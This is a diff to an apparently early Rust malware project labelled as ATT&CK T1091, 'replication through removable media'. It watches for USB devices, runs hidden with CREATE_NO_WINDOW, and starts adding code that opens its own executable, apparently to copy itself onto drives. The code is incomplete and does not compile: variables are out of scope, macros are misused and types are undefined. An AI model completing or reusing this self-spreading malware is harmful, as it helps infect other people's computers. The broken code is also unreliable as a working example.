@@ -2,6 +2,7 @@ use std::process::{Command, Stdio};
 use std::os::windows::process::CommandExt;
 use winapi::um::winbase::CREATE_NO_WINDOW;
 use libusb::{self, DeviceList};
+use std::fs::File;
 use std::env;
 
 
@@ -9,26 +10,29 @@ fn main() {
     let args: Vec<String> = env::args().collect();
     if args.len() != 1{
         eprintln("[-] err: too many args");
-        eprintln("[*] example : {} filename.exe")
+        eprintln("[*] example : {} C:\\Windows\\System32\\filename.exe")
     }
 
     eprintln!("[*] removable media replication att&ck id: T1091");
-    eprintln!("[*]written by peroxidee / iluvwerewolves ");
+    eprintln!("[*] written by peroxidee / iluvwerewolves ");
     
     processHandler();
         
 }
 
 fn duplicate(device: &Device) -> Result<(), Error>{
-    if let Ok(handle) =device.open{
-        // to do: add moving files...
+    if let Ok(handle) = device.open() {
+       
+        let mut f = File::open(args[0])?;
+        let mut fc = f.try_clone()?;
+        
     }
     Ok(())
 }
 
 fn getinfo(device: &Device) -> Result<(), Error>{
     if let Ok(handle) = device.open(){
-        
+        println!(device);    
     }
 
     Ok(())
@@ -37,12 +41,11 @@ fn monitor() -> Result<(), Error>{
 
     let lusb_context = Context::new()?;
 
-    let lusb_context.devices.unwrap();
-    let prev = lusb_context.devices.unwrap();
+    let prev = lusb_context.devices()?;
     
     loop { 
 
-        let connected_usb_devices = lusb_context.devices().unwrap();
+        let connected_usb_devices = lusb_context.devices()?;
         if connected_usb_devices.len() != prev.len(){  
             for device in connected_usb_devices.iter(){
                 match getinfo(&device){
@@ -50,9 +53,8 @@ fn monitor() -> Result<(), Error>{
                     Err(e) => eprintln!("[-] err: {:?}", e)
                 }  
             }
-        sleep(30)
-        
         }
+        sleep(30);
     }
 
     Ok(())
@@ -80,7 +82,7 @@ fn start(cmd: &Command) -> Result<(), std::io::Error>{
         
 
 
-        child.wait().expect("[-] err: issue encountered with child process.");
+        child.wait()?;
     
         monitor();
         Ok(())
